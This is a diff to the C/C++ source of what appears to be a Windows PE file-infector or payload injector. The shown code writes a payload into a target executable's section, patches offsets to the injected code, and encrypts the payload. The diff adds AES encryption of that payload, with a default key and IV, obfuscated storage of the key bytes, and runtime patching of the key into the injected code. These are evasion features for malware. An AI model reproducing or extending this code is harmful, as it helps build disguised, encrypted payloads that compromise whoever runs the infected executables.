@@ -1,11 +1,29 @@
 #include <Windows.h>
 #include <stdio.h>
 #include <string.h>
+#include "libaes.h"
 #include "payload.h"
 #include "utils.h"
 
 #ifndef NO_ENCRYPT
 #include "encrypt.hpp"
+
+#ifdef _CONF_AES_KEY
+#define CONF_AES_KEY _CRT_STRINGIZE(_CONF_AES_KEY)
+#else  // _CONF_AES_KEY
+#define CONF_AES_KEY "sUp3rDuP3rS3cr3T"
+#endif  // _CONF_AES_KEY
+C_ASSERT(sizeof(CONF_AES_KEY) - 1 == AES_KEYSIZE);
+
+#ifdef _CONF_AES_IV
+#define CONF_AES_IV _CRT_STRINGIZE(_CONF_AES_IV)
+#else  // _CONF_AES_IV
+#define CONF_AES_IV "r4Nd0MiVR4nD0mIv"
+#endif  // _CONF_AES_IV
+C_ASSERT(sizeof(CONF_AES_IV) - 1 == AES_BLOCKSZ);
+
+static CONST auto aesKey_obf = ObfuscatedBytes(CONF_AES_KEY);
+static CONST auto aesIv_obf = ObfuscatedBytes(CONF_AES_IV);
 #endif  // NO_ENCRYPT
 
 int main(int argc, char* argv[]) {
@@ -29,6 +47,8 @@ int main(int argc, char* argv[]) {
     DWORD dwSignature;
 #endif  // SKIP_SIGN
 #ifndef NO_ENCRYPT
+    CONST auto DEOBF(aesKey) = Deobfuscator(aesKey_obf.data);
+    CONST auto DEOBF(aesIv) = Deobfuscator(aesIv_obf.data);
     SSIZE_T sszPayloadEncOffset, sszPayloadEncSize;
     DWORD dwMissingBytes;
 #endif  // NO_ENCRYPT
@@ -162,6 +182,17 @@ int main(int argc, char* argv[]) {
     to_c_code = (PCBYTE)&inj_code_c - (PCBYTE)&payload;
     VirtualProtect(&to_c_code, sizeof(to_c_code), dwOldProtect, &dwOldProtect);
 
+#ifndef NO_ENCRYPT
+    // Make aes_key and aes_iv writable to update their values
+    VirtualProtect(&aes_key, sizeof(aes_key), PAGE_READWRITE, &dwOldProtect);
+    memcpy(aes_key, aesKey_obf.data, sizeof(aes_key));
+    VirtualProtect(&aes_key, sizeof(aes_key), dwOldProtect, &dwOldProtect);
+
+    VirtualProtect(&aes_iv, sizeof(aes_iv), PAGE_READWRITE, &dwOldProtect);
+    memcpy(aes_iv, aesIv_obf.data, sizeof(aes_iv));
+    VirtualProtect(&aes_iv, sizeof(aes_iv), dwOldProtect, &dwOldProtect);
+#endif  // NO_ENCRYPT
+
     // Section raw data must be aligned to FileAlignment
     // Since the original section is assumed to be aligned, we just need to align the payload
     dwSizeAligned = ALIGN(dwPayloadSize, dwFileAlignment);
@@ -234,6 +265,10 @@ int main(int argc, char* argv[]) {
 
 #ifndef NO_ENCRYPT
     printf("[*] Encrypting payload...\n");
+    printf("[*] Using AES key:\n");
+    HexDump((PCBYTE)DEOBF_BYTES(aesKey), DEOBF(aesKey).size);
+    printf("[*] Using AES IV:\n");
+    HexDump((PCBYTE)DEOBF_BYTES(aesIv), DEOBF(aesIv).size);
     sszPayloadEncOffset = &__payload_enc_start - &__payload_start;
     printf("Encrypted payload offset: %#llx\n", sszPayloadEncOffset);
     if (sszPayloadEncOffset < 0) {
@@ -242,7 +277,8 @@ int main(int argc, char* argv[]) {
         goto unmap;
     }
 
-    if (EncryptPayload(pPayloadDest + sszPayloadEncOffset, sszPayloadEncSize)) {
+    if (EncryptPayload(pPayloadDest + sszPayloadEncOffset, sszPayloadEncSize,
+                       (PCAES_KEY)DEOBF_BYTES(aesKey), (PCAES_IV)DEOBF_BYTES(aesIv))) {
         ret = 1;
         goto unmap;
     }
